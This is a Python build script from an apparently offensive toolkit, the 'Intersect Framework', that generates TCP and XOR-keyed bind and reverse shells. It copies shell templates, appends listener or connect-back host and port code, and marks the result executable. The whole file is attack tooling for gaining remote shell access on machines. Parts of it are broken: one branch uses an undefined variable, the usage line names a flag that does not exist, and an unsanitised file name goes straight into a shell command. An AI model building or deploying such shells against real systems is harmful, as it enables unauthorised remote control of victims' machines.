#!/usr/bin/python

# Intersect Framework
# Server-side shell generation

# usage: ./build.py --type=tcpbind --host=192.168.1.4 --port=4444 --name=newshell

import sys, os
import argparse
import shutil
import logging


Templates = ("src/Templates/remote/")
Scripts = ("Scripts/")
BuildLog = ("Logs/build_log")

logging.basicConfig(filename=BuildLog, level=logging.INFO, format='%(asctime)s %(message)s')


help = """Quickly create an Intersect server-side shell.
Specify the shell type, host and port information and a name for your new shell."""

parser = argparse.ArgumentParser(description=help)
parser.add_argument('--address', help='IP address for listen or bind shell', required=True)
parser.add_argument('--port', help='Port for listen or bind shell.', required=True, type=int)
parser.add_argument('--type', help='Type of shell.', required=True, choices=["tcpbind", "tcprev", "xorbind", "xorrev"])
parser.add_argument('--name', help='Filename new shell will be saved as.', required=True)
parser.add_argument('--key', help='XOR private key')

# Setup necessary variables
args = parser.parse_args()


if args.type == "tcpbind":
    template = (Templates+"tcpbind.py")
    if os.path.exists(Scripts+args.name) is False:
        shutil.copy2(template, Scripts+args.name)
        makeshell = open(Scripts+args.name, "a")
        makeshell.write("\nHOST = '%s'" % args.address)
        makeshell.write("\nPORT = %s" % int(args.port))
        makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
        makeshell.write("\nconn.bind((HOST, PORT))")
        makeshell.write("\nconn.listen(5)")
        makeshell.write("\naccept()")
        os.system("chmod u+x %s" % Scripts+args.name)
        logging.info("TCP bind shell created. %s:%s %s" % (args.address, args.port, args.name))
        print("New shell created!")
        print("Location: %s" % Scripts+args.name)
    else:
        print("Filename all ready exists!")
        sys.exit()


elif args.type == "tcprev":
    template = (Templates+"tcprev.py")
    if os.path.exists(Scripts+args.name) is False:
        shutil.copy2(template, Scripts+args.name)
        makeshell = open(Scripts+args.name, "a")
        makeshell.write("\n    HOST = '%s'" % args.address)
        makeshell.write("\n    PORT = %s" % int(args.port))
        makeshell.write("\n\nglobalvars()")
        makeshell.write("\nmain()")
        makeshell.close()
        os.system("chmod u+x %s" % Scripts+args.name)
        logging.info("TCP reverse shell created. %s:%s %s" % (args.address, args.port, args.name))
        print("New shell created!")
        print("Location: %s" % Scripts+args.name)
    else:
        print("Filename all ready exists!")
        sys.exit()
    
    
elif args.type == "xorbind":
    template = (Templates+"xorbind.py")
    if os.path.exists(Scripts+args.name) is False:
        shutil.copy2(template, Scripts+name)
        makeshell = open(Scripts+name, "a")
        makeshell.write("\nHOST = '%s'" % args.address)
        makeshell.write("\nPORT = %s" % int(args.port))
        makeshell.write("\npin = '%s'" % args.key)
        makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
        makeshell.write("\nconn.bind((HOST, PORT))")
        makeshell.write("\nconn.listen(5)")
        makeshell.write("\naccept()")
        makeshell.close()
        os.system("chmod u+x %s" % Scripts+args.name)
        logging.info("TCP XOR bind shell created. %s:%s %s" % (args.address, args.port, args.name))
        print("New shell created!")
        print("Location: %s" % Scripts+args.name)
                    
                    
elif args.type == "xorrev":
    template = (Templates+"xorrev.py")
    shutil.copy2(template, Scripts+args.name)
    makeshell = open(Scripts+args.name, "a")
    makeshell.write("\n    HOST = '%s'" % args.address)
    makeshell.write("\n    PORT = %s" % int(args.port))
    makeshell.write("\n    pin = '%s'" % args.key)
    makeshell.write("\n\nglobalvars()")
    makeshell.write("\nmain()")
    makeshell.close()
    os.system("chmod u+x %s" % Scripts+args.name)
    logging.info("TCP XOR reverse shell created. %s:%s %s" % (args.address, args.port, args.name))
    print("New shell created!")
    print("Location: %s" % Scripts+args.name)